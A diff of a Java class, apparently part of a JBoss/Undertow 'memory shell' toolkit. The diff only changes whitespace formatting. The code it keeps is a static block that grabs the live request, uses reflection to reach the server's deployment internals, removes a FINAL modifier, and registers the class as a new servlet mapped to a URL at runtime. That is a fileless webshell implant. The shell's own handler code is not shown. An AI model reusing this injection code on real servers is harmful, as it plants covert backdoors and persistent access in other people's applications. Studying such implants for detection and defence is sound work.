@@ -30,8 +30,8 @@ public class JBSMSFromContextS implements Servlet {
     static {
         try {
             HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
-            ServletContext         context = request.getServletContext();
-            Field                  f       = context.getClass().getDeclaredField("deploymentInfo");
+            ServletContext context = request.getServletContext();
+            Field f = context.getClass().getDeclaredField("deploymentInfo");
             f.setAccessible(true);
             DeploymentInfo deploymentInfo = (DeploymentInfo) f.get(context);
 
@@ -39,7 +39,7 @@ public class JBSMSFromContextS implements Servlet {
             Map<String, ServletInfo> servlets = deploymentInfo.getServlets();
             if (!servlets.containsKey(NAME)) {
 
-                Class       clazz       = JBSMSFromContextS.class;
+                Class clazz = JBSMSFromContextS.class;
                 ServletInfo servletInfo = new ServletInfo(NAME, clazz, new ConstructorInstanceFactory<Servlet>(clazz.getDeclaredConstructor()));
                 deploymentInfo.addServlet(servletInfo);
 
@@ -49,7 +49,7 @@ public class JBSMSFromContextS implements Servlet {
                 modifiersField.setAccessible(true);
                 modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                 DeploymentImpl deployment = (DeploymentImpl) f.get(context);
-                ServletHandler handler    = deployment.getServlets().addServlet(servletInfo);
+                ServletHandler handler = deployment.getServlets().addServlet(servletInfo);
 
                 ServletRegistrationImpl registration = new ServletRegistrationImpl(servletInfo, handler.getManagedServlet(), deployment);
                 registration.addMapping(pattern);
